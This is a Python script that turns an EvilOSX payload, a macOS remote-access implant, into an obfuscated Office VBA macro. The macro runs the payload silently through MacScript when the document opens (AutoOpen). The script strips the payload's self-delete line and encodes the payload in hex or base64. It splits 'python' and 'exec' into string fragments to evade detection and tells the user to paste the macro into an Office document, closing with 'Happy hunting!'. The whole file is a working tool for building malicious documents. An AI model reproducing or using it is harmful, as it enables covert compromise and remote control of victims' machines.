import optparse
from optparse import OptionParser
import sys
import base64
import binascii
import os
import random
from random import randrange

if ((len(sys.argv) < 5 or len(sys.argv) > 5) and '-h' not in sys.argv):
    print("Usage: python3 %s -p <path_to_EvilOSX_python_payload> -e [\"hex\" or \"b64\"]" % sys.argv[0])
    sys.exit(1)

parser = OptionParser()
parser.add_option("-p", "--payload", help="EvilOSX python payload")
parser.add_option("-e", "--encoding", help="Type of encoding (hex or base64)")
(options, args) = parser.parse_args()

payload = options.payload
encoding = options.encoding

if os.path.exists(payload):
    rowcount = randrange(40,60)
    with open('%s'%payload, 'r') as file:
        data = file.read()
        data = data.replace("subprocess.Popen(\"rm -rf \" + __file__, shell=True)","")

    if encoding == "hex":
        data2 = binascii.hexlify(data.encode('utf-8'))
    elif encoding == "b64":
        data2 = base64.b64encode(data.encode('utf-8'))
    else:
        print("Unsupported encoding option entered. Use -e hex or -e b64. Exiting")
        sys.exit(1)
    
    macrofile = open('macro.txt', 'w')
    macrofile.write('Sub AutoOpen()\n')
    macrofile.write("a = \"p\" + \"yth\" + \"on\"\n")
    macrofile.write("b = \"e\" + \"x\" + \"e\" + \"c\"\n")
    macrofile.write("")

    initializer = 0
    totallength = len(data2)
    chars = 'abcdef'
    varname = ''.join(random.choices(chars, k=8))
    while totallength > 0:
        if initializer == 0:
            int1 = rowcount*initializer
            int2 = rowcount + int1
            text2 = data2[int1:int2].decode('utf8')
            macrofile.write("%s = \"%s\"\n" % (varname,text2))
            totallength = totallength - rowcount
            initializer = initializer + 1
        else:
            int3 = rowcount*initializer
            int4 = rowcount + int3
            text3 = data2[int3:int4].decode('utf8')
            macrofile.write("%s = %s + \"%s\"\n" % (varname,varname,text3))
            totallength = totallength - rowcount
            initializer = initializer + 1

    if encoding == "hex":
        macro = "MacScript (\"do shell script \"\"\" & a & \" -c \\\"\"import base64,binascii,sys,socket,commands,os,ssl;\" & b & \"(binascii.unhexlify({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('\" & %s & \"')))\\\"\" &> /dev/null \"\"\")\n" % varname
    elif encoding == "b64":
        macro = "MacScript (\"do shell script \"\"\" & a & \" -c \\\"\"import base64,binascii,sys,socket,commands,os,ssl;\" & b & \"(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('\" & %s & \"')))\\\"\" &> /dev/null \"\"\")\n" % varname
    macrofile.write(macro)
    macrofile.write("End Sub\n")
    macrofile.close()

    print("-"*100)
    print("Happy hunting!")
    print('')
    print("EvilOSX macro was written to macro.txt in the current working directory. Simply copy it and paste it into your Office document of choice.")
    print("DONE!")

else:
    print("[-] File path not found! Exiting")
    sys.exit(1)
